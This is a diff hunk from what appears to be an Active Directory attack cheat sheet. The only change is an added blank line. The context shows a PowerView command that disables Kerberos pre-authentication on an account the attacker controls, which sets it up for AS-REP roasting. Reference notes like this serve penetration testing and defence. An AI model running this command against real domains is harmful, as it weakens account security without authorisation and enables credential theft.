@@ -22,6 +22,7 @@
     ```
 ### Set DON'T_REQ-PREAUTH using Powerview
 > Useful if you have generic all over an account and don't want to reset the password   
+    
     ```ps1
     Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
     ```
